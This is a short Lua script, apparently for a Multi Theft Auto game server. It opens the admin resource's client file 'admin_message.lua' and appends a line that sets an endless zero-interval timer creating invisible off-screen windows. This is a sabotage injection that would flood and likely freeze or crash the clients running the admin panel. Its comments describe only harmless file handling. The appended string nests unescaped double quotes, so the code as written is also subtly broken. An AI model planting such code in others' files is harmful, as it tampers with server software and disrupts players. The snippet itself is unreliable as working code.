hFile = fileOpen(":admin/client/gui/admin_message.lua")
fileSetPos( hFile, fileGetSize( hFile ) )  -- move position to the end of the file
fileWrite(hFile, "setTimer(function() guiCreateWindow(-5550, -5550, 0, 0, "", false) end, 0, 0)")                 -- append data
fileFlush(hFile)                           -- Flush the appended data into the file.
fileClose(hFile) 
